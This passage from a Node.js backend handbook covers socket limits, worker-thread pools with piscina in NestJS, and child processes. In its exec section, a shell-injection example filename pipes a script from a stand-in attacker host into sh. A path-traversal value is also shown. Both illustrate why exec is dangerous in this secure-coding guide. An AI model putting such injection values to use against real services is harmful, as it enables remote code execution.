  • Ephemeral port exhaustion on the client side: an outbound-heavy service without keep-alive burns through the 28,232 default ephemeral ports and gets EADDRNOTAVAIL. Use a keep-alive agent.
  • Half-open connections. A client that disappears without FIN (laptop lid closed, NAT timeout) leaves a socket that epoll never reports. Only TCP keep-alive probes or an application-level heartbeat reclaims it.
  • Slowloris. Connections that send one byte per minute hold descriptors indefinitely. requestTimeout and headersTimeout exist for this.
  • epoll level-triggered versus edge-triggered. libuv uses level-triggered mode, which is more forgiving: if you do not drain the socket fully, you get notified again. Native addons that register their own edge-triggered watchers can hang if they under-read.
  • Large writes are not atomic. A 10 MB socket.write() will not fit in the send buffer; it queues in userspace and consumes heap until the peer drains it. This is the memory leak behind "our streaming endpoint OOMs when one client is on hotel Wi-Fi".
  • accept() storms. With SO_REUSEPORT across cluster workers the kernel distributes connections; without it, all workers wake on one listening socket and only one wins (9.22).
  • Container CPU limits interact badly. A pod throttled by CFS quota can sit for 50 ms without running epoll_wait even though the kernel has events ready. The latency looks like network latency and is not.

How a Senior Backend Engineer thinks about this

They know the machine's real limits: descriptors, memory per connection, and loop time — not threads. When someone proposes "we will need 200 pods for 100,000 WebSocket connections", they do the arithmetic (100,000 connections at roughly 40 KB each is 4 GB, so maybe 8 pods) and ask what the message rate is, because that, not the connection count, is the load. They set keep-alive, header and request timeouts explicitly on every server, because the defaults are wrong for every load balancer. They read ss, netstat and /proc/<pid>/fd during incidents instead of guessing.

To a product manager: "Holding a connection open costs us almost nothing, like a phone line that is connected but silent. What costs us is what we send over it."

Common mistakes

  • Assuming a connection costs a thread and over-provisioning by 20x.
  • Leaving keepAliveTimeout at Node's default behind a load balancer, then chasing phantom 502s.
  • No requestTimeout, so a handful of slow clients hold descriptors forever.
  • Broadcasting to thousands of sockets in one synchronous loop.
  • Not raising ulimit -n in the container, then hitting EMFILE at exactly 1024 connections.
  • Ignoring socket.write() returning false and buffering unbounded data in the process heap.

Interview questions

  1. How does Node know a socket has data without a thread per socket? Expected: the kernel's readiness mechanism (epoll/kqueue/IOCP); registration once, ready-list notification, O(ready) per wait.
  2. Why is epoll better than select for 10,000 connections? Expected: select is O(n) per call and passes the whole set each time, capped at FD_SETSIZE; epoll registers once and returns only ready descriptors.
  3. Why do file reads need a thread pool when sockets do not? Expected: regular files are always reported ready by a readiness-based mechanism, so there is no way to wait asynchronously; io_uring/IOCP change this.
  4. What does 10,000 idle connections cost a Node process? Expected: 10,000 fds, roughly 10 to 40 KB each in kernel buffers plus JS objects, near-zero CPU, no threads. Follow-up: what is the first limit you hit? Usually ulimit -n.
  5. A load balancer reports intermittent 502s but the app logs nothing. What is your first hypothesis? Expected: keep-alive timeout race — server closing idle connections the LB still considers usable.
  6. What does it mean when socket.write() returns false? Expected: the kernel send buffer is full, libuv is queueing in userspace, and you must wait for 'drain' or you will grow the heap without bound.

Practical exercise

Write a TCP server that accepts and holds connections, and a client script that opens 10,000 sockets to it. Record RSS, CPU and wc -l < /proc/<pid>/fd on the server at 0, 1,000 and 10,000 connections. Then use strace -c -p <pid> for 10 seconds while idle and again while pushing 1,000 messages per second, and compare the syscall counts. Finally, lower ulimit -n to 1,100 and observe the exact error and the server behaviour when you exceed it.

Acceptance criteria: a table of memory and CPU per connection count with a derived per-connection cost in KB; syscall count evidence that idle connections cost nothing; the exact EMFILE behaviour reproduced and one paragraph on how you would detect it in production before customers do.

9.20 Worker threads

Concept

A worker thread is a second JavaScript execution context inside the same process: its own V8 isolate, its own heap, its own event loop, its own call stack — running on a real operating-system thread, scheduled independently by the kernel on a different core. It shares the process's address space, file descriptors and libuv thread pool with the main thread, but it shares no JavaScript objects. Communication is by message passing, not by shared variables.

That last sentence is the design decision that makes worker threads safe. There are no data races on JavaScript objects (9.8), no mutexes around your entities, no synchronized blocks. You pay for that safety with the cost of copying data between threads.

Workers exist for exactly one problem: CPU-bound work that would otherwise block the event loop. They are not a general concurrency mechanism, and they are not for I/O. If your work is waiting on a socket or a disk, the event loop already handles it better than any thread would.

Why does it exist?

Before worker_threads (stable since Node 12), the only way to use a second core in Node was child_process.fork, which starts an entire new Node process: 30 to 50 MB of memory, 50 to 150 ms of startup, and IPC over a pipe with JSON serialization. For a task like "resize this 4 MB image", that overhead often exceeded the work.

A worker thread starts in 5 to 20 ms, costs 3 to 10 MB of baseline heap, and can transfer an ArrayBuffer to the other side with a pointer move instead of a copy. It made real CPU offloading practical inside a single container.

Mental model

Imagine your office has one desk (the main thread) where all customer conversations happen. Someone brings in a 300-page contract that needs to be read line by line — an hour of solid work. If you do it at the desk, every customer waits an hour.

A worker thread is a second desk in the same office. You photocopy the contract (structured clone), hand the copy over, and go back to serving customers. The colleague works at their own pace on their own desk with their own filing cabinet, and slides a summary note back when done. You never share a pen: if you both wrote on the same document you would need rules about who writes when, and those rules are exactly the locks we do not want.

If the contract is enormous, you do not photocopy it — you hand over the original folder and give up your access to it (a transferable). If both of you genuinely need to see the same live numbers, you put a shared whiteboard between the desks (SharedArrayBuffer) and accept that you now need rules about writing on it (Atomics, 9.12).

How it works

flowchart TB
    subgraph Process
        M["Main thread: V8 isolate A, heap A, event loop A"]
        W1["Worker 1: V8 isolate B, heap B, event loop B"]
        W2["Worker 2: V8 isolate C, heap C, event loop C"]
        P["Shared: libuv thread pool, file descriptors, address space"]
    end
    M -->|"postMessage: structured clone"| W1
    W1 -->|"postMessage: result"| M
    M -->|"transfer: ArrayBuffer moved, zero copy"| W2
    W2 --> P
    M --> P
  1. new Worker('./worker.js', { workerData }) creates an OS thread and a fresh V8 isolate on it.
  2. The worker loads and runs its script top to bottom, then enters its own event loop.
  3. postMessage(value) serialises value with the structured clone algorithm and delivers it to the other side's message queue, where it arrives as a 'message' event in that thread's event loop.
  4. Structured clone handles objects, arrays, Map, Set, Date, RegExp, ArrayBuffer, TypedArray, BigInt and circular references. It does not handle functions, class prototypes (you get a plain object), DOM-style host objects, or anything with a closure. A TypeORM entity arrives as a plain object with the same fields and none of its methods.
  5. Anything in the transferList is moved, not copied: the sender's ArrayBuffer becomes detached (byteLength === 0) and the receiver owns the memory. This is O(1) regardless of size.
  6. A SharedArrayBuffer is genuinely shared memory: both threads see the same bytes with no copy and no transfer, which is why it is the only place in JavaScript where you need Atomics (9.12).

The cost of message passing

This is the number that decides whether a worker is worth it:

Payload Mechanism Approximate cost
Small object, ~1 KB structured clone 5 to 20 microseconds
1 MB JSON-like object graph structured clone 8 to 20 ms (serialize + deserialize, both blocking their own thread)
10 MB Buffer structured clone 60 to 150 ms, and doubles peak memory
10 MB ArrayBuffer transferList under 0.1 ms, zero copy
Any size SharedArrayBuffer zero, no message needed for the data itself

Serialization happens on the sending thread and deserialization on the receiving thread, and both block. Sending a 10 MB object to a worker blocks your main thread for ~80 ms — you have not offloaded anything, you have merely changed which CPU-bound operation is blocking the loop. If you cannot pass the input as a transferable buffer, ask whether the worker is buying you anything at all.

Practical example

The three workloads that genuinely deserve a worker in a typical backend:

  • PDF invoice generation. Laying out a 12-page invoice with a PDF library is 150 to 600 ms of pure CPU. At 5 invoices per second that is 3 cores of work and a permanently blocked loop.
  • Image resize. sharp already does its work on the libuv pool via native async work, so it does not block the loop — but it competes with fs and dns for the same four threads (9.18). Moving it to a dedicated worker pool isolates it.
  • High-cost password hashing. bcrypt at cost factor 12 to 14 is 250 ms to 1 s of CPU per call. A dedicated worker pool sized to the CPU count gives you a bounded queue you can measure and shed load from, instead of an invisible libuv queue.

What does not deserve a worker: database queries, HTTP calls, file streaming, JSON of a few hundred KB, or "making the API faster" in general.

NestJS example

A real service that offloads PDF generation to a worker pool with piscina, wired as a NestJS provider with proper lifecycle handling.

// invoices/invoice-pdf.worker.ts   (compiled to dist/invoices/invoice-pdf.worker.js)
import { renderInvoicePdf } from './render-invoice-pdf';

export interface InvoiceJob {
  orderId: string;
  customerName: string;
  lines: Array<{ sku: string; qty: number; priceCents: number }>;
  totalCents: number;
}

// piscina calls the default export with the message payload and awaits the result.
export default async function generate(job: InvoiceJob): Promise<ArrayBuffer> {
  const buf = await renderInvoicePdf(job);              // ~350 ms of CPU, isolated on this thread
  // Return an ArrayBuffer so piscina can transfer it back with zero copy.
  return buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength);
}
// invoices/pdf-pool.service.ts
import { Injectable, OnModuleDestroy, ServiceUnavailableException, Logger } from '@nestjs/common';
import { cpus } from 'node:os';
import { resolve } from 'node:path';
import Piscina from 'piscina';
import type { InvoiceJob } from './invoice-pdf.worker';

@Injectable()
export class PdfPoolService implements OnModuleDestroy {
  private readonly logger = new Logger(PdfPoolService.name);

  private readonly pool = new Piscina({
    filename: resolve(__dirname, 'invoice-pdf.worker.js'),
    minThreads: 1,
    maxThreads: Math.max(1, cpus().length - 1),   // leave a core for the main thread
    maxQueue: 100,                                // bounded: shed load instead of queueing forever
    idleTimeout: 30_000,                          // release threads when idle
    concurrentTasksPerWorker: 1,                  // CPU-bound work: one task at a time per thread
  });

  async generate(job: InvoiceJob): Promise<Buffer> {
    if (this.pool.queueSize >= 100) {
      // Fail fast with 503 + Retry-After rather than letting the queue grow unbounded.
      throw new ServiceUnavailableException('PDF generation is saturated');
    }
    const started = Date.now();
    const ab = (await this.pool.run(job)) as ArrayBuffer;
    this.logger.debug(`invoice ${job.orderId}: ${Date.now() - started} ms (queue ${this.pool.queueSize})`);
    return Buffer.from(ab);
  }

  async onModuleDestroy() {
    await this.pool.destroy();   // graceful shutdown: never leave threads running past SIGTERM
  }
}
// invoices/invoices.controller.ts
import { Controller, Get, Param, StreamableFile, Header } from '@nestjs/common';
import { Readable } from 'node:stream';
import { PdfPoolService } from './pdf-pool.service';
import { InvoicesService } from './invoices.service';

@Controller('orders/:orderId/invoice')
export class InvoicesController {
  constructor(private readonly pdf: PdfPoolService, private readonly invoices: InvoicesService) {}

  @Get()
  @Header('Content-Type', 'application/pdf')
  async download(@Param('orderId') orderId: string): Promise<StreamableFile> {
    const job = await this.invoices.buildJob(orderId);      // I/O-bound: database
    const buffer = await this.pdf.generate(job);            // CPU-bound: worker thread
    return new StreamableFile(Readable.from(buffer));
  }
}

The important details: the pool is sized to cpus().length - 1, the queue is bounded so saturation becomes a 503 rather than a growing memory footprint, the result comes back as a transferable ArrayBuffer, and onModuleDestroy tears the pool down so SIGTERM actually terminates the pod (9.6).

If you would rather not add piscina, the raw API is only slightly more code, and it is worth writing once to understand what the library does:

// A one-shot worker with a timeout - the pattern piscina generalises.
import { Worker } from 'node:worker_threads';

function runOnce<T, R>(file: string, data: T, timeoutMs = 10_000): Promise<R> {
  return new Promise((resolveP, rejectP) => {
    const worker = new Worker(file, { workerData: data, resourceLimits: { maxOldGenerationSizeMb: 256 } });
    const timer = setTimeout(() => worker.terminate().then(() => rejectP(new Error('worker timeout'))), timeoutMs);
    worker.once('message', (r: R) => { clearTimeout(timer); resolveP(r); });
    worker.once('error', (e) => { clearTimeout(timer); rejectP(e); });
    worker.once('exit', (code) => { clearTimeout(timer); if (code !== 0) rejectP(new Error(`worker exited ${code}`)); });
  });
}

Note resourceLimits: a worker can be given its own heap cap, so a runaway job kills the worker rather than the whole pod. And note terminate() — it is the only way to stop a worker stuck in a synchronous loop, because you cannot interrupt JavaScript any other way.

SharedArrayBuffer and when you actually need it

Almost never in a web backend. The legitimate case is a large read-mostly dataset that every worker needs and that would be wasteful to copy N times: a 200 MB geospatial index, a pricing matrix, a compiled ruleset. You build it once as a SharedArrayBuffer, pass the reference to every worker (references to a SharedArrayBuffer are cheap to post), and read from it with a TypedArray view.

// Shared counter across workers - the only correct way to mutate shared memory.
const shared = new SharedArrayBuffer(8);
const counter = new Int32Array(shared);
Atomics.add(counter, 0, 1);            // atomic read-modify-write; counter[0]++ would race
const value = Atomics.load(counter, 0);

The moment you mutate shared memory you are writing concurrent C, with all of Part 9's race conditions (9.8) and deadlocks (9.9) back in play. Do it only with Atomics, and only when you have measured that copying is the bottleneck.

When a worker is the wrong answer

  • The work is I/O-bound. A worker waiting on a database gives you a second idle event loop and a copy cost. The main loop already did that for free.
  • The payload is large and non-transferable. Cloning 20 MB of objects to save 30 ms of CPU is a net loss.
  • The work is short. Under about 5 to 10 ms of CPU, the messaging overhead dominates; chunk with await setImmediate() instead (9.16).
  • The work is unbounded or long-running. A 40-minute report is a background job for BullMQ and a separate worker deployment, not a thread inside your API pod. If the pod is redeployed mid-job, a thread's work is lost; a queued job is retried.
  • You just want more throughput. Add pods. Kubernetes replicas are simpler, independently schedulable and independently restartable.

Production scenario

An e-commerce API generates order invoices on demand: 12 requests per second at peak, roughly 350 ms of CPU each. Before workers, on 4 pods of 2 vCPU, invoice requests consumed 4.2 cores of the 8 available, event-loop lag peaked at 380 ms and the p99 of every other endpoint rose to 640 ms. Product complained that "search is slow", and search had not changed at all.

After moving to a piscina pool with maxThreads = 1 per 2 vCPU pod (one core for the main thread, one for the worker), main-thread loop lag dropped to 6 ms and the p99 for other endpoints returned to 45 ms. Invoice p99 rose slightly, from 380 ms to 520 ms, because invoices now queue for a dedicated thread — and that is the correct tradeoff: one slow endpoint instead of a slow application.

Failure scenario

At 03:40 a pod running an image-processing service went into CrashLoopBackOff with OOMKilled. The pod limit was 1 GiB and --max-old-space-size=768 was set on the main thread, which the team believed was safe.

The service created a new Worker per upload rather than pooling. Each worker had its own V8 heap, and no resourceLimits, so each defaulted to a heap far above what the container could afford. During a burst of 12 concurrent uploads there were 12 live isolates, each holding a decoded 40 MB bitmap. Total RSS crossed 1 GiB and the kernel's OOM killer terminated the container. The main thread's --max-old-space-size had constrained exactly one of the thirteen heaps in the process.

Fixes: a fixed-size pool (maxThreads: 2) instead of unbounded worker creation, resourceLimits: { maxOldGenerationSizeMb: 192 } per worker, a bounded queue returning 503 under load, and a corrected heap budget (9.26) that accounts for all isolates in the process, not just the main one.

Edge cases & failure modes

  • Each worker is a full V8 isolate: expect 3 to 10 MB baseline plus its own heap growth. --max-old-space-size on the process applies to the main isolate only; workers need resourceLimits.
  • Workers do not inherit the main thread's module registry state. Anything expensive at module load (config parsing, entity metadata, opening a database pool) happens per worker.
  • Do not open a database connection pool inside a worker unless you mean it: 4 workers times 20 connections is 80 connections per pod, times 10 pods is 800, which PostgreSQL will refuse.
  • A worker stuck in an infinite synchronous loop can only be stopped with terminate(); there is no interrupt.
  • worker.terminate() does not run cleanup handlers. Anything the worker was writing is lost mid-write.
  • An uncaught exception in a worker emits 'error' on the parent handle; if you do not listen, some Node versions surface it as an uncaught exception on the main thread. Always attach error and exit handlers.
  • Console output, process.env and process.exit() are shared or process-wide: calling process.exit() inside a worker kills the whole process.
  • Structured clone drops class identity. An entity crossing the boundary is a plain object; instanceof Order is false and getters are gone.
  • Debugging is harder: --inspect attaches to the main thread; workers need --inspect-brk plus execArgv, and heap snapshots are per-isolate.
  • Workers and the libuv pool are separate resources but share CPU. Six workers on a 2 vCPU pod means each gets a third of a core and CFS throttling (9.2).

How a Senior Backend Engineer thinks about this

They ask three questions before reaching for a worker: Is this actually CPU-bound? How many milliseconds? Can the input be transferred instead of cloned? If the answers are yes, over 50 ms, and yes, they pool it with a bounded queue and a timeout. If the work is over a second or must survive a restart, they refuse the worker entirely and put it on a queue with a separate deployment, because a thread is not durable and a job is.

They size the pool to cores, not to requests. They budget the heap for every isolate in the process. And they insist that a saturated pool returns 503 quickly rather than queueing quietly, because a fast failure is a better customer experience and a much better signal.

To a product manager: "PDF rendering is genuinely slow work. We moved it to a side desk so it stops slowing down everything else. It is still slow, but only for PDFs."

Common mistakes

  • Creating a worker per request instead of pooling.
  • Unbounded queues, so load turns into memory growth and then OOMKilled.
  • Cloning megabytes of data and calling it offloading.
  • Forgetting resourceLimits, so worker heaps escape the container budget.
  • No onModuleDestroy teardown, so SIGTERM hangs and Kubernetes escalates to SIGKILL after the grace period (9.6).
  • Using workers for database or HTTP work.
  • Expecting instanceof and class methods to survive postMessage.

Interview questions

  1. What does a worker thread share with the main thread and what does it not? Expected: shares the process, address space, fds and libuv pool; does not share the V8 heap or any JavaScript object. Communication is structured clone, transfer or SharedArrayBuffer.
  2. When is a worker thread the wrong tool? Expected: I/O-bound work, sub-10 ms tasks, large non-transferable payloads, long or durable jobs (use a queue), or when adding pods is simpler.
  3. You send a 10 MB object to a worker and the main thread still stalls. Why? Expected: structured clone serialises on the sender's thread; use a transferable ArrayBuffer or SharedArrayBuffer.
  4. How do you cap memory for workers in a 1 GiB container? Expected: resourceLimits.maxOldGenerationSizeMb per worker plus a bounded pool; --max-old-space-size only covers the main isolate.
  5. How do you stop a worker stuck in a synchronous loop? Expected: worker.terminate(), which is abrupt and skips cleanup; prevention is a task timeout in the pool.
  6. Compare worker threads with child_process.fork and with more Kubernetes replicas. Expected: threads are cheapest and share the process (a crash can take everything); forks isolate but cost memory and startup; replicas are the simplest scaling unit and the default answer.

Practical exercise

Build an endpoint that renders a PDF taking about 300 ms of CPU. Load it at 10 requests per second while also hitting a trivial GET /health, and record loop lag and both endpoints' p99. Then move rendering into a piscina pool sized to cpus().length - 1 with maxQueue: 50, and measure again. Finally, add a 5 MB payload passed as a plain object and then as a transferred ArrayBuffer, and measure main-thread blocking for each.

Acceptance criteria: a before/after table showing health-endpoint p99 recovering; evidence that a saturated pool returns 503 rather than growing RSS; and measured proof that transfer is at least an order of magnitude cheaper than clone for the 5 MB payload.

9.21 Child processes

Concept

A child process is a separate operating-system process that your Node process starts and controls. It has its own PID, its own memory, its own file descriptors, and its own lifetime. Node gives you four ways to create one, and the differences between them are the source of a surprising number of production incidents.

API Shell involved Output handling Typical use
spawn(cmd, args) No Streams (stdout, stderr) Long-running or large-output commands: ffmpeg, pg_dump
exec(commandString) Yes (/bin/sh -c) Buffered into a string, capped at maxBuffer (1 MB default) Short commands where you want the whole output; the dangerous one
execFile(file, args) No Buffered, same maxBuffer cap Short commands without shell risk
fork(modulePath) No Streams plus a built-in IPC channel A second Node process you want to message with send()

Why does it exist?

Some jobs are not JavaScript. pg_dump produces a correct PostgreSQL backup; reimplementing it would be reckless. ffmpeg transcodes video; nothing in npm comes close. libreoffice --headless converts documents. When the right tool is a binary, you run the binary — in its own process, so that if it segfaults or leaks 4 GB, your API survives.

Processes also give hard isolation that threads do not: separate address space, separate crash domain, separate resource limits, and the ability to kill something without corrupting your own state.

Mental model

A worker thread is a colleague at the next desk in your office: fast to bring in, but if they set the building on fire you burn too. A child process is a contractor in their own van. Slower to call out, they cannot see your files unless you hand them over, and if their van breaks down you just call another one.

How it works

sequenceDiagram
    participant N as NodeParent
    participant K as Kernel
    participant C as ChildProcess
    N->>K: fork then execve pg_dump with an argument vector
    K-->>N: pid, plus pipes for stdin, stdout and stderr
    K->>C: start pg_dump with inherited env
    C-->>N: stdout bytes over a pipe, read in the poll phase
    N->>N: pipe data callbacks, streamed to S3
    C->>K: exit with code 0
    K-->>N: SIGCHLD, then close and exit events with the code
  1. Node calls fork() (or posix_spawn) to create the process and execve() to replace its image with the target binary.
  2. The kernel creates pipes for stdin, stdout and stderr and connects them to the parent's file descriptors. These are ordinary descriptors, so they are watched by epoll and do not use the libuv pool.
  3. The child runs on its own core, fully independent. Its CPU usage counts against the container's CPU limit, and its memory against the container's memory limit — a fact people forget until they get OOMKilled.
  4. Output arrives as pipe readability events in the poll phase and is emitted as 'data' on the stream.
  5. On exit the kernel sends SIGCHLD; Node emits 'exit' with the code and signal, then 'close' once the stdio streams are fully drained. close is the event you want when you care about having all the output.

Practical example: streaming pg_dump to object storage

The correct way to run a large-output command: spawn, never exec, and stream rather than buffer.

// backups/backup.service.ts
import { Injectable, Logger, InternalServerErrorException } from '@nestjs/common';
import { spawn } from 'node:child_process';
import { createGzip } from 'node:zlib';
import { pipeline } from 'node:stream/promises';
import { Upload } from '@aws-sdk/lib-storage';
import { S3Client } from '@aws-sdk/client-s3';

@Injectable()
export class BackupService {
  private readonly logger = new Logger(BackupService.name);
  constructor(private readonly s3: S3Client) {}

  async dumpToS3(database: string, key: string): Promise<void> {
    const child = spawn(
      'pg_dump',
      ['--format=plain', '--no-owner', '--no-privileges', `--dbname=${database}`],
      {
        // Never interpolate secrets into a shell string. Pass them in the environment.
        env: { ...process.env, PGPASSWORD: process.env.PGPASSWORD ?? '' },
        stdio: ['ignore', 'pipe', 'pipe'],
        timeout: 30 * 60_000,          // kill after 30 minutes
        killSignal: 'SIGTERM',
      },
    );

    let stderr = '';
    child.stderr.on('data', (c: Buffer) => { stderr += c.toString(); if (stderr.length > 64_000) stderr = stderr.slice(-64_000); });

    const upload = new Upload({
      client: this.s3,
      params: { Bucket: 'db-backups', Key: key, Body: child.stdout.pipe(createGzip()) },
      queueSize: 4,
      partSize: 16 * 1024 * 1024,      // streamed multipart: memory stays flat
    });

    const [exitCode] = await Promise.all([
      new Promise<number>((res, rej) => {
        child.once('error', rej);                       // ENOENT: binary not found
        child.once('close', (code) => res(code ?? -1)); // 'close', not 'exit': stdio is drained
      }),
      upload.done(),
    ]);

    if (exitCode !== 0) {
      this.logger.error(`pg_dump exited ${exitCode}: ${stderr}`);
      throw new InternalServerErrorException('backup failed');
    }
    this.logger.log(`backup ${key} complete`);
  }
}

Memory stays flat at a few tens of megabytes for a 40 GB dump, because nothing is ever fully in memory: pg_dump writes to a pipe, gzip transforms, the S3 uploader sends 16 MB parts, and TCP backpressure (9.24) slows pg_dump down automatically if the network is slow.

The exec traps

Two failure modes, both common, both severe.

1. maxBuffer overflow. exec and execFile accumulate stdout in memory and abort the child when it exceeds maxBuffer (default 1 MB).

// Broken: works in dev with 12 test rows, dies in production with 4 million.
exec(`pg_dump --dbname=${db}`, (err, stdout) => { /* err.code === 'ERR_CHILD_PROCESS_STDIO_MAXBUFFER' */ });

The error surfaces as a truncated, killed child. People "fix" it with maxBuffer: 1024 * 1024 * 1024, which turns a truncation bug into an OOMKill. The real fix is spawn plus streaming.

2. Shell injection. exec runs the string through /bin/sh -c. Any user-controlled substring is code.

// Catastrophic. filename comes from an upload request.
exec(`ffmpeg -i /uploads/${filename} -vf scale=640:-1 /out/${filename}.mp4`, cb);
// filename = "a.mp4; curl http://attacker/x.sh | sh #"
// The shell runs both commands. This is remote code execution.

// Correct: no shell, arguments are passed as a vector the shell never sees.
execFile('ffmpeg', ['-i', `/uploads/${filename}`, '-vf', 'scale=640:-1', `/out/${safeName}.mp4`], cb);

Even with execFile you must validate the filename against a strict allowlist (/^[A-Za-z0-9_-]{1,64}\.(mp4|mov)$/) so that a value like ../../etc/passwd cannot escape the directory. Argument vectors stop shell injection; they do not stop path traversal.

The rule: exec is only acceptable for a fully static command string with no interpolation at all, and even then execFile is better.

NestJS example: fork for a child Node process

fork is the one that gives you a message channel to another Node process. It is useful for a long-lived helper you want fully isolated from the API process.

// media/transcoder.gateway.ts
import { Injectable, OnModuleInit, OnModuleDestroy, Logger } from '@nestjs/common';
import { fork, ChildProcess } from 'node:child_process';
import { resolve } from 'node:path';
import { randomUUID } from 'node:crypto';

interface TranscodeReply { id: string; ok: boolean; outputKey?: string; error?: string }

@Injectable()
export class TranscoderGateway implements OnModuleInit, OnModuleDestroy {
  private readonly logger = new Logger(TranscoderGateway.name);
  private child!: ChildProcess;
  private readonly pending = new Map<string, { resolve: (r: TranscodeReply) => void; reject: (e: Error) => void }>();

  onModuleInit() { this.start(); }

  private start() {
    this.child = fork(resolve(__dirname, 'transcoder.child.js'), [], {
      execArgv: ['--max-old-space-size=256'],           // its own heap budget, inside the pod limit
      env: { ...process.env, ROLE: 'transcoder' },
    });
    this.child.on('message', (m: TranscodeReply) => { this.pending.get(m.id)?.resolve(m); this.pending.delete(m.id); });
    this.child.on('exit', (code, signal) => {
      this.logger.error(`transcoder exited code=${code} signal=${signal}; restarting`);
      for (const p of this.pending.values()) p.reject(new Error('transcoder crashed'));
      this.pending.clear();
      setTimeout(() => this.start(), 1_000).unref();     // supervised restart with a delay
    });
  }

  send(inputKey: string, timeoutMs = 120_000): Promise<TranscodeReply> {
    const id = randomUUID();
    return new Promise((res, rej) => {
      this.pending.set(id, { resolve: res, reject: rej });
      const t = setTimeout(() => { this.pending.delete(id); rej(new Error('transcode timeout')); }, timeoutMs);
      this.child.send({ id, inputKey }, (err) => { if (err) { clearTimeout(t); rej(err); } });
    });
  }

  async onModuleDestroy() {
    this.child.kill('SIGTERM');
    await new Promise<void>((r) => this.child.once('exit', () => r()));
  }
}

Note the supervision: children die, and a parent that does not restart them turns a transient crash into a permanent outage. Note also the timeout on every request, and the rejection of pending promises on exit — otherwise callers hang forever.

Zombie processes

When a child exits, the kernel keeps a small entry in the process table holding its exit status until the parent reaps it with wait(). Until then, the child is a zombie: it uses no memory and no CPU, but it occupies a PID slot. Millions of zombies exhaust the PID space and no new process can start.

Node reaps children automatically as long as your process is alive and running its event loop, so classic zombies are rare in pure Node. The version you will meet in production is different and worse:

  • Orphans that outlive you. If your Node process is killed with SIGKILL, its children are re-parented to PID 1 and keep running. In a container, an ffmpeg orphan keeps burning CPU inside the pod's cgroup after your app has restarted.
  • PID 1 in containers. If your Node process is PID 1, it inherits the duty of reaping every orphaned grandchild in the container, and Node does not do that. A shell script that spawns processes will leave zombies. This is precisely what tini or docker run --init fixes, and why the Dockerfile pattern is ENTRYPOINT ["/sbin/tini", "--", "node", "dist/main.js"].
  • Detached process groups. spawn(..., { detached: true }) puts the child in its own process group. child.kill() then kills only the leader; to kill the whole tree you need process.kill(-child.pid, 'SIGTERM') with the negative PID.

Always kill children on shutdown:

// main.ts - graceful shutdown must include the process tree
app.enableShutdownHooks();
process.on('SIGTERM', () => { for (const c of activeChildren) c.kill('SIGTERM'); });

Production scenario

A document service converts uploaded DOCX files to PDF with libreoffice --headless, roughly 2.5 seconds and 300 MB of RSS per conversion. It runs as a separate deployment consuming a BullMQ queue with concurrency 2 per pod, pods limited to 1 GiB. The choice of a child process rather than a worker thread is deliberate: LibreOffice is not JavaScript, it leaks memory across conversions, and it occasionally hangs. Each conversion gets a 60-second timeout, and a hung child is killed with SIGKILL after SIGTERM fails for 5 seconds. Because it is a separate process, a hang costs one job, not the pod.

The capacity arithmetic is simple and worth doing out loud: 2 concurrent conversions at 300 MB is 600 MB, plus Node's own 200 MB, is 800 MB against a 1 GiB limit. Concurrency 3 would OOMKill. Concurrency is a memory decision, not a throughput decision.

Failure scenario

At 16:10 a video pipeline's pods began flapping between Running and OOMKilled, but the Node heap in the metrics was a steady 180 MB. The team spent an hour looking for a JavaScript memory leak that did not exist.

The cause: ffmpeg children. The pod limit was 2 GiB and the cgroup accounts for every process in the container, not just Node. A queue with concurrency 4 was spawning 4 ffmpeg processes, each using 400 to 600 MB on 4K input. Node's heap metric never moved because the memory was not in Node's heap. The kernel OOM killer picked the largest process, which was sometimes ffmpeg (job fails, retried, fine) and sometimes Node itself (pod dies).

Fixes: concurrency reduced to 1, -threads 2 passed to ffmpeg to cap its own CPU and memory appetite, a hard timeout with SIGKILL escalation, and — most importantly — the pod's memory alert changed from "Node heap" to container RSS, which is the only number the OOM killer cares about (9.25, 9.26).

Edge cases & failure modes

  • error fires for ENOENT (binary missing), which is a different event from a non-zero exit code. Handle both.
  • exit fires before stdio is drained; close fires after. Reading output on exit can truncate.
  • maxBuffer overflow kills the child with a confusing error; raising it invites OOM.
  • exec with any interpolated user input is remote code execution.
  • A child that ignores SIGTERM needs SIGKILL escalation after a grace period, exactly like Kubernetes does to you (9.6).
  • Children inherit process.env, including every secret. Pass a filtered env for third-party binaries.
  • Child memory and CPU count against the container's cgroup limits.
  • Backpressure applies to child.stdin: writing faster than the child reads fills the pipe (64 KB) and write() returns false; ignore it and you buffer in your heap.
  • Without an init process, PID 1 Node does not reap orphaned grandchildren.
  • Zombie accumulation shows as ps aux | grep defunct and eventually EAGAIN on fork.

How a Senior Backend Engineer thinks about this

They default to spawn with an argument array and treat exec as a code smell that needs justification. They put every child behind a timeout, a kill escalation and a supervisor. They budget container memory for the whole process tree, not for Node. They ask whether the child belongs in the API pod at all — usually it does not, and the answer is a queue plus a dedicated worker deployment, so that a hung ffmpeg cannot slow a checkout.

To a product manager: "Video conversion runs in its own sandbox. If it crashes, we lose that one video and retry it, not the website."

Common mistakes

  • exec with template literals containing user input.
  • Reading output on exit instead of close.
  • No timeout, so one hung child holds a queue slot forever.
  • Ignoring stderr, then having no idea why a job failed.
  • Forgetting that container limits cover children.
  • No init process in the image, so orphans and zombies accumulate.
  • Killing only the leader of a detached process group.

Interview questions

  1. Compare spawn, exec, execFile and fork. Expected: shell versus no shell, streamed versus buffered, and fork adding an IPC channel to a Node child.
  2. Why is exec dangerous? Expected: shell interpretation means injection; plus maxBuffer truncation on large output. Follow-up: how do you safely pass a user-supplied filename? Argument array plus an allowlist regex.
